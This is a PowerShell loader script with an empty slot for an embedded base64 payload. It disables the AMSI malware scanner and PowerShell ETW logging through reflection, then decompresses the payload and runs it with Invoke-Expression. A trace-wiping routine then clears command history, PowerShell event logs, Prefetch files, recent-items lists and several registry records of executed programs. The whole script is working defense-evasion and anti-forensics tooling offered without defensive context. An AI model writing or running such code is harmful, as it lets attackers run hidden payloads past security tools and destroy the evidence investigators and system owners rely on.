$base64 = @'

'@
$base64 = $base64 -replace '\s+', ''
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
        GetField('amsiInitFailed','NonPublic,Static').
        SetValue($null,$true)
} catch {}
try {
    $provider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').
        GetField('etwProvider','NonPublic,Static').GetValue($null)
    $provider.GetType().GetMethod('Disable').Invoke($provider,@())
} catch {}
try {
    $compressedBytes = [Convert]::FromBase64String($base64)
    $ms = New-Object IO.MemoryStream(, $compressedBytes)
    $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gz)
    $payload = $sr.ReadToEnd()
    $sr.Dispose() | Out-Null
    $gz.Dispose() | Out-Null
    $ms.Dispose() | Out-Null
    [GC]::Collect() | Out-Null 
    Invoke-Expression $payload
}
catch {
}
function Clear-Traces {
    $ErrorActionPreference = 'SilentlyContinue'
    Clear-History
    if (Get-Command Get-PSReadLineOption -EA SilentlyContinue) {
        $hist = (Get-PSReadLineOption).HistorySavePath
        if ($hist -and (Test-Path $hist)) { Remove-Item $hist -Force }
        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*" -Force -Recurse
    }
    @('Microsoft-Windows-PowerShell/Operational', 'Windows PowerShell') | ForEach-Object {
        wevtutil cl $_ 2>$null
    }
    Remove-Item "$env:WINDIR\Prefetch\POWERSHELL*.pf" -Force 2>$null
    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -EA 0
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse 2>$null
    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\MuiCache' -Name * -EA 0
    Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom' -Name * -EA 0
    Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers' -Name * -EA 0
}
Clear-Traces
Start-Sleep -Milliseconds 800 
Clear-Traces
[GC]::Collect() | Out-Null
exit 0